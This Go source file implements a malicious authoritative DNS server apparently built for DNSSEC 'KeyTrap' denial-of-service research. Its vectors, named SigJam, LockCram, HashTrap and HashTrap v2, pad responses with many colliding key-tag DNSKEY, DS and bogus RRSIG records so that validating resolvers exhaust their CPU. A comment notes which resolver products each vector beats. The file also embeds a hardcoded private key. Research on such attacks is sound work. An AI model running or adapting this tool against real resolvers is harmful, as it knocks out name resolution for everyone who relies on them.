package main

import (
	"log"
	"net"
	"os"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/tochusc/godns"
	"github.com/tochusc/godns/dns"
	"github.com/tochusc/godns/dns/xperi"
)

// HashTrap v2攻击向量
// ✔️Unbound 		MAX_DS_MATCH_FAILURE(5)
// ❌BIND		   #DS<100 and #DNSKEY<100
// ✔️Knot Resolver	Expensive Crypto Limited
// ❌PDNS Recursor  #DS<=9 and #DNSKEY<=2
var ExperiVec = KeyTrapVector{
	CollidedSigNum: 1,
	CollidedZSKNum: 1,

	CollidedKSKNum: 4,
	CollidedDSNum:  10,

	// www.atk.test
	// atk.test -> test
	// atk.test 80 DS_KSK,
	//	DS 16 KegTag== DS
	//  KSK 4 KeyTag== KSK
	// 80 * 17 = 1280 #DS
	// 5 * 80 = 400 #KSK

	ANYRRSetNum:    1,
	DS_KSK_PairNum: 80,
}

//
// 32req/s 32dif Malfare Auth. 32 * 400 KSK(Random), 32*1280 DS(Random)
// Pre-Generate:
// DS --> KSK
// RRSIG --> RDATA
//
// Goroutine
//
// Graph --> Load, Loss(Benign request script: 10 req/s got answer?)
//
// No DNSSEC -->
// DNSSEC -->
//
// Local ? Remote
//
// Virtual

// var ExperiVec = KeyTrapVector{
// 	// KeySigTrap:(SigJam, LockCram)
// 	CollidedSigNum: 1, // SigJam
// 	CollidedZSKNum: 1, // LockCram

// 	// HashTrap
// 	CollidedKSKNum: 1,
// 	CollidedDSNum:  1,

// 	// HashTrap v2
// 	DS_KSK_PairNum: 1,

// 	// ANY
// 	ANYRRSetNum: 1,
// }

type KeyTrapResponser struct {
	ResponserLogger *log.Logger
	DNSSECManager   godns.DNSSECManager
}

// KeyTrap攻击向量
type KeyTrapVector struct {
	// SigJam
	CollidedSigNum int
	// LockCram
	CollidedZSKNum int
	// HashTrap
	CollidedKSKNum int
	CollidedDSNum  int
	// ANY
	ANYRRSetNum int

	// HashTrap v2
	DS_KSK_PairNum int
}

type KeyTrapManager struct {
	// DNSSEC 配置
	DNSSECConf godns.DNSSECConfig

	// 区域名与其相应 DNSSEC 材料的映射
	// 在初始化 DNSSEC Responser 时需要为其手动添加信任锚点
	DNSSECMap sync.Map

	// KeyTrap攻击向量
	AttackVec KeyTrapVector
}

type DNSSECMaterial struct {
	// Key Tag
	ZSKTag int
	KSKTag int

	// 公钥RDATA
	ZSKRecord dns.DNSResourceRecord
	KSKRecord dns.DNSResourceRecord

	// 私钥字节
	ZSKPriv []byte
	KSKPriv []byte
}

func (m *KeyTrapManager) SignSection(section []dns.DNSResourceRecord) []dns.DNSResourceRecord {
	rMap := make(map[string][]dns.DNSResourceRecord)
	for _, rr := range section {
		if rr.Type == dns.DNSRRTypeRRSIG {
			continue
		}
		rid := rr.Name + rr.Type.String() + rr.Class.String()
		rMap[rid] = append(rMap[rid], rr)
	}
	for _, rrset := range rMap {
		// SigJam攻击向量：CollidedSigNum
		// 生成 错误RRSIG 记录
		uName := dns.GetUpperDomainName(&rrset[0].Name)
		dMat := m.GetDNSSECMaterial(uName)

		for i := 0; i < m.AttackVec.CollidedSigNum; i++ {
			wRRSIG := xperi.GenerateRandomRRRRSIG(
				rrset,
				m.DNSSECConf.DAlgo,
				uint32(time.Now().UTC().Unix()+86400-3600),
				uint32(time.Now().UTC().Unix()-3600),
				uint16(dMat.ZSKTag),
				uName,
			)
			section = append(section, wRRSIG)
		}

		sig := m.SignRRSet(rrset)
		section = append(section, sig)
	}
	return section
}

func (m *KeyTrapManager) SignRRSet(rrset []dns.DNSResourceRecord) dns.DNSResourceRecord {
	uName := dns.GetUpperDomainName(&rrset[0].Name)
	dMat := m.GetDNSSECMaterial(uName)

	sort.Sort(dns.ByCanonicalOrder(rrset))

	sig := xperi.GenerateRRRRSIG(
		rrset,
		m.DNSSECConf.DAlgo,
		uint32(time.Now().UTC().Unix()+86400-3600),
		uint32(time.Now().UTC().Unix()-3600),
		uint16(dMat.ZSKTag),
		uName,
		dMat.ZSKPriv,
	)
	return sig
}

func (m *KeyTrapManager) EnableDNSSEC(qry dns.DNSMessage, resp *dns.DNSMessage) {
	qType := qry.Question[0].Type

	// ANY攻击向量
	if qType == dns.DNSQTypeANY {
		// 生成任意类型的 RR 集合
		anyset := []dns.DNSResourceRecord{}
		var sType = 4096
		for i := 0; i < m.AttackVec.ANYRRSetNum; i++ {
			rr := dns.DNSResourceRecord{
				Name:  qry.Question[0].Name,
				Type:  dns.DNSType(sType + i),
				Class: dns.DNSClassIN,
				TTL:   86400,
				RDLen: 0,
				RData: &dns.DNSRDATAA{Address: net.IPv4(10, 10, 10, 10)},
			}
			anyset = append(anyset, rr)
		}
		resp.Answer = append(resp.Answer, anyset...)
	}

	// 签名回答部分
	resp.Answer = m.SignSection(resp.Answer)
	// 签名权威部分
	resp.Authority = m.SignSection(resp.Authority)
	// 签名附加部分
	resp.Additional = m.SignSection(resp.Additional)
	m.EstablishToC(qry, resp)
}

func (m *KeyTrapManager) CreateDNSSECMaterial(zName string) DNSSECMaterial {
	zskRecord, zskPriv := xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.DAlgo, dns.DNSKEYFlagZoneKey)
	zskTag := xperi.CalculateKeyTag(*zskRecord.RData.(*dns.DNSRDATADNSKEY))
	for zskTag < uint16(m.AttackVec.CollidedZSKNum) {
		zskRecord, zskPriv = xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.DAlgo, dns.DNSKEYFlagZoneKey)
		zskTag = xperi.CalculateKeyTag(*zskRecord.RData.(*dns.DNSRDATADNSKEY))
	}

	kskRecord, kskPriv := xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.DAlgo, dns.DNSKEYFlagSecureEntryPoint)
	kskTag := xperi.CalculateKeyTag(*kskRecord.RData.(*dns.DNSRDATADNSKEY))
	for kskTag < uint16(m.AttackVec.DS_KSK_PairNum) {
		kskRecord, kskPriv = xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.DAlgo, dns.DNSKEYFlagSecureEntryPoint)
		kskTag = xperi.CalculateKeyTag(*kskRecord.RData.(*dns.DNSRDATADNSKEY))
	}

	return DNSSECMaterial{
		ZSKTag: int(zskTag),
		KSKTag: int(kskTag),

		ZSKRecord: zskRecord,
		KSKRecord: kskRecord,

		ZSKPriv: zskPriv,
		KSKPriv: kskPriv,
	}
}

// GetDNSSECMaterial 获取指定区域的 DNSSEC 材料
// 如果该区域的 DNSSEC 材料不存在，则会根据 DNSSEC 配置生成一个
func (m *KeyTrapManager) GetDNSSECMaterial(zName string) DNSSECMaterial {
	dMat, ok := m.DNSSECMap.Load(zName)
	if !ok {
		dMat = m.CreateDNSSECMaterial(zName)
		m.DNSSECMap.Store(zName, dMat)
	}
	return dMat.(DNSSECMaterial)
}

// EstablishToC 根据查询自动添加 DNSKEY，DS，RRSIG 记录
// 自动完成信任链（Trust of Chain）的建立。
// 其接受参数为：
//   - qry dns.DNSMessage，查询信息
//   - m.DNSSECConf DNSSECConfig，DNSSEC 配置
//   - dMap map[string]DNSSECMaterial，区域名与其相应 DNSSEC 材料的映射
//   - resp *dns.DNSMessage，回复信息
func (m *KeyTrapManager) EstablishToC(qry dns.DNSMessage, resp *dns.DNSMessage) error {
	// 提取查询类型和查询名称
	qType := qry.Question[0].Type
	qName := strings.ToLower(qry.Question[0].Name)
	dMat := m.GetDNSSECMaterial(qName)

	if qType == dns.DNSRRTypeDNSKEY {
		// 如果查询类型为 DNSKEY，

		// LockCram攻击向量：CollidedKeyNum
		// 生成 错误ZSK DNSKEY 记录
		rrset := []dns.DNSResourceRecord{dMat.ZSKRecord, dMat.KSKRecord}
		for i := 0; i < m.AttackVec.CollidedZSKNum; i++ {
			wZSK := xperi.GenerateRandomDNSKEYWithTag(
				m.DNSSECConf.DAlgo,
				dns.DNSKEYFlagZoneKey,
				dMat.ZSKTag,
			)
			rrset = append(rrset, dns.DNSResourceRecord{
				Name:  qName,
				Type:  dns.DNSRRTypeDNSKEY,
				Class: dns.DNSClassIN,
				TTL:   86400,
				RDLen: uint16(wZSK.Size()),
				RData: &wZSK,
			})
		}
		// HashTrap v2 攻击向量: DS_KSK_PairNum
		for i := 1; i <= m.AttackVec.DS_KSK_PairNum; i++ {
			kskTag := dMat.KSKTag - i
			kskRR := xperi.GenerateRandomDNSKEYWithTag(
				m.DNSSECConf.DAlgo,
				dns.DNSKEYFlagSecureEntryPoint,
				kskTag,
			)
			rrset = append(rrset, dns.DNSResourceRecord{
				Name:  qName,
				Type:  dns.DNSRRTypeDNSKEY,
				Class: dns.DNSClassIN,
				TTL:   86400,
				RDLen: uint16(kskRR.Size()),
				RData: &kskRR,
			})

			// HashTrap攻击向量: CollidedKSKNum
			// 生成 错误KSK DNSKEY 记录
			for i := 0; i < m.AttackVec.CollidedKSKNum; i++ {
				wKSK := xperi.GenerateRandomDNSKEYWithTag(
					m.DNSSECConf.DAlgo,
					dns.DNSKEYFlagSecureEntryPoint,
					int(kskTag),
				)
				rrset = append(rrset, dns.DNSResourceRecord{
					Name:  qName,
					Type:  dns.DNSRRTypeDNSKEY,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: uint16(wKSK.Size()),
					RData: &wKSK,
				})
			}
		}
		sort.Sort(dns.ByCanonicalOrder(rrset))
		// 生成密钥集签名
		sig := xperi.GenerateRRRRSIG(
			rrset,
			dns.DNSSECAlgorithmECDSAP384SHA384,
			uint32(time.Now().UTC().Unix()+86400-3600),
			uint32(time.Now().UTC().Unix()-3600),
			uint16(dMat.KSKTag),
			qName,
			dMat.KSKPriv,
		)
		rrset = append(rrset, sig)

		resp.Answer = append(resp.Answer, rrset...)
		resp.Header.RCode = dns.DNSResponseCodeNoErr
	} else if qType == dns.DNSRRTypeDS {
		// 如果查询类型为 DS，则生成 DS 记录
		dMat := m.GetDNSSECMaterial(qName)

		rrset := []dns.DNSResourceRecord{}

		// HashTrap v2 攻击
		for i := 0; i < m.AttackVec.DS_KSK_PairNum; i++ {
			kskTag := dMat.KSKTag - i
			// HashTrap 攻击向量：CollidedDSNum
			// 生成 错误DS 记录
			for i := 0; i < m.AttackVec.CollidedDSNum; i++ {
				wDS := xperi.GenerateRandomRRDS(qName, kskTag, m.DNSSECConf.DAlgo, m.DNSSECConf.DType)
				rrset = append(rrset, wDS)
			}
		}

		// 生成正确DS记录
		kskRData, _ := dMat.KSKRecord.RData.(*dns.DNSRDATADNSKEY)
		ds := xperi.GenerateRRDS(qName, *kskRData, m.DNSSECConf.DType)
		rrset = append(rrset, ds)

		upName := dns.GetUpperDomainName(&qName)
		dMat = m.GetDNSSECMaterial(upName)

		sort.Sort(dns.ByCanonicalOrder(rrset))

		sig := xperi.GenerateRRRRSIG(
			rrset,
			m.DNSSECConf.DAlgo,
			uint32(time.Now().UTC().Unix()+86400-3600),
			uint32(time.Now().UTC().Unix()-3600),
			uint16(dMat.ZSKTag),
			upName,
			dMat.ZSKPriv,
		)

		rrset = append(rrset, sig)

		resp.Answer = append(resp.Answer, rrset...)
		resp.Header.RCode = dns.DNSResponseCodeNoErr
	}
	godns.FixCount(resp)
	return nil
}
func (r *KeyTrapResponser) Response(connInfo godns.ConnectionInfo) ([]byte, error) {
	// 解析查询信息
	qry, err := godns.ParseQuery(connInfo)
	if err != nil {
		r.ResponserLogger.Printf("Error parsing query: %v", err)
		return []byte{}, err
	}

	// 将可能启用0x20混淆的查询名称转换为小写
	qName := strings.ToLower(qry.Question[0].Name)
	qType := qry.Question[0].Type
	qClass := qry.Question[0].Class

	r.ResponserLogger.Printf("Recive DNS Query from %s,Protocol: %s,  Name: %s, Type: %s, Class: %s\n",
		connInfo.Address.String(), connInfo.Protocol, qName, qType, qClass)

	// 初始化 NXDOMAIN 回复信息
	resp := godns.InitNXDOMAIN(qry)

	switch qType {
	case dns.DNSRRTypeA:
		// 生成 A 记录
		rr := dns.DNSResourceRecord{
			Name:  qName,
			Type:  dns.DNSRRTypeA,
			Class: dns.DNSClassIN,
			TTL:   86400,
			RDLen: 0,
			RData: &dns.DNSRDATAA{Address: net.IPv4(10, 10, 1, 3)},
		}
		resp.Answer = append(resp.Answer, rr)
	case dns.DNSRRTypeNS:
		// 生成 NS 记录
		rr := dns.DNSResourceRecord{
			Name:  qName,
			Type:  dns.DNSRRTypeNS,
			Class: dns.DNSClassIN,
			TTL:   86400,
			RDLen: 0,
			RData: &dns.DNSRDATANS{NSDNAME: qName},
		}
		resp.Answer = append(resp.Answer, rr)
	}

	// 为回复信息添加 DNSSEC 记录
	r.DNSSECManager.EnableDNSSEC(qry, &resp)

	// 设置RCODE，修正计数字段，返回回复信息
	resp.Header.RCode = dns.DNSResponseCodeNoErr
	godns.FixCount(&resp)

	data := resp.Encode()

	// crsp, err := dns.CompressDNSMessage(data)
	// if err != nil {
	// 	r.ResponserLogger.Printf("Error compressing response: %v", err)
	// 	return data, nil
	// } else {
	// 	return crsp, nil
	// }

	return data, nil
}

func main() {
	conf := godns.DNSServerConfig{
		IP:   net.IPv4(10, 10, 1, 3),
		Port: 53,

		// stdout
		LogWriter: os.Stdout,

		EnebleCache:   true,
		CacheLocation: "./cache",

		PoolCapcity: -1,
	}

	// 生成 KSK 和 ZSK
	// 使用ParseKeyBase64解析预先生成的公钥，
	// 该公钥应确保能够被解析器通过 信任锚（Trust Anchor）建立的 信任链（Chain of Trust） 所验证。
	kskPublic := xperi.ParseKeyBase64("MzJsFTtAo0j8qGpDIhEMnK4ImTyYwMwDPU5gt/FaXd6TOw6AvZDAj2hlhZvaxMXV6xCw1MU5iPv5ZQrb3NDLUU+TW07imJ5GD9YKi0Qiiypo+zhtL4aGaOG+870yHwuY")
	kskPriv := xperi.ParseKeyBase64("ppaXHmb7u1jOxEzrLzuGKzbjmSLIK4gEhQOvws+cpBQyJbCwIM1Nrk4j5k94CP9e")

	material := InitMaterial("test", dns.DNSSECAlgorithmECDSAP384SHA384, kskPublic, kskPriv)

	dMap := sync.Map{}
	dMap.Store("test", material)

	server := godns.NewGoDNSServer(conf,
		&KeyTrapResponser{
			ResponserLogger: log.New(conf.LogWriter, "KeyTrapResponser: ", log.LstdFlags),
			DNSSECManager: &KeyTrapManager{
				DNSSECConf: godns.DNSSECConfig{
					DAlgo: dns.DNSSECAlgorithmECDSAP384SHA384,
					DType: dns.DNSSECDigestTypeSHA384,
				},
				DNSSECMap: dMap,
				AttackVec: ExperiVec,
			},
		},
	)

	server.Start()
}

// InitTrustAnchor 根据 DNSSEC 配置生成指定区域的信任锚点
// 其接受参数为：
//   - zName string，区域名
//   - dConf DNSSECConfig，DNSSEC 配置
//   - kBytes []byte，KSK 公钥
//   - pkBytes []byte，KSK 私钥
//
// 返回值为：
//   - map[string]DNSSECMaterial，生成的信任锚点
func InitMaterial(name string, algo dns.DNSSECAlgorithm, kskPublic, kskPriv []byte) DNSSECMaterial {

	zskRR, zskPriv := xperi.GenerateRRDNSKEY(name, algo, dns.DNSKEYFlagZoneKey)
	zskRDATA := zskRR.RData.(*dns.DNSRDATADNSKEY)

	kskRDATA := dns.DNSRDATADNSKEY{
		Flags:     dns.DNSKEYFlagSecureEntryPoint,
		Protocol:  dns.DNSKEYProtocolValue,
		Algorithm: algo,
		PublicKey: kskPublic,
	}

	kskRR := dns.DNSResourceRecord{
		Name:  name,
		Type:  dns.DNSRRTypeDNSKEY,
		Class: dns.DNSClassIN,
		TTL:   86400,
		RDLen: uint16(kskRDATA.Size()),
		RData: &kskRDATA,
	}

	zskTag := xperi.CalculateKeyTag(*zskRDATA)
	kskTag := xperi.CalculateKeyTag(kskRDATA)

	return DNSSECMaterial{
		ZSKTag: int(zskTag),
		KSKTag: int(kskTag),

		ZSKRecord: zskRR,
		KSKRecord: kskRR,

		ZSKPriv: zskPriv,
		KSKPriv: kskPriv,
	}
}
